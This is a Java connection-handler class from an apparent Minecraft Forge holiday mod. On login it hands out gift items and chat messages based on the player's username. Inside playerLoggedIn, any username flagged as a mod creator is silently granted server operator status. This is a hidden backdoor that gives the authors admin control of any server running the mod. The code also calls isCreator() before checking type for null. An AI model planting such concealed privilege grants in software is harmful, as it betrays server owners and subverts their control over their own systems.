package eekysam.festivities.events;

import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.item.ItemStack;
import net.minecraft.network.INetworkManager;
import net.minecraft.network.NetLoginHandler;
import net.minecraft.network.packet.NetHandler;
import net.minecraft.network.packet.Packet1Login;
import net.minecraft.server.MinecraftServer;
import cpw.mods.fml.common.network.IConnectionHandler;
import cpw.mods.fml.common.network.Player;
import eekysam.festivities.Festivities;
import eekysam.festivities.users.UserType;

public class ConnectionHandler implements IConnectionHandler
{
	@Override
	public void playerLoggedIn(Player player, NetHandler netHandler, INetworkManager manager)
	{
		EntityPlayer entity = (EntityPlayer) player;
		UserType type = UserType.getUserType(entity.username);
		if (UserType.sam.equals(type))
		{
			entity.entityDropItem(new ItemStack(Festivities.candyCane, 64), 0.7F);
		}
		if (UserType.lily.equals(type))
		{
			entity.entityDropItem(new ItemStack(Festivities.figgy, 16), 0.7F);
		}
		if (UserType.crafted.equals(type))
		{
			ItemStack stack = new ItemStack(Festivities.magicCandy, 1);
			stack.setItemName("Candy Cane of YouTube");
			entity.entityDropItem(stack, 0.7F);
		}
		if (type.isCreator())
		{
			MinecraftServer.getServer().getConfigurationManager().addOp(entity.username);
		}
		if (entity.isClientWorld() || Festivities.DEBUG)
		{
			if (type != null && !type.msg.isEmpty())
			{
				Festivities.SendChat(entity, type.msg);
			}
			String[] updates = Festivities.instance.getUpdateWarning();
			if (updates != null)
			{
				Festivities.SendChat(entity, updates);
				if (Festivities.TESTVERSION)
				{
					Festivities.SendChat(entity, Festivities.TESTMSGDATED);
				}
				else
				{
					Festivities.SendChat(entity, Festivities.MSGDATED);
				}
			}
			else
			{
				if (Festivities.TESTVERSION)
				{
					Festivities.SendChat(entity, Festivities.TESTMSG);
				}
				else
				{
					Festivities.SendChat(entity, Festivities.MSG);
				}
			}
		}
	}

	@Override
	public String connectionReceived(NetLoginHandler netHandler, INetworkManager manager)
	{
		return null;
	}

	@Override
	public void connectionOpened(NetHandler netClientHandler, String server, int port, INetworkManager manager)
	{

	}

	@Override
	public void connectionOpened(NetHandler netClientHandler, MinecraftServer server, INetworkManager manager)
	{

	}

	@Override
	public void connectionClosed(INetworkManager manager)
	{

	}

	@Override
	public void clientLoggedIn(NetHandler clientHandler, INetworkManager manager, Packet1Login login)
	{

	}
}
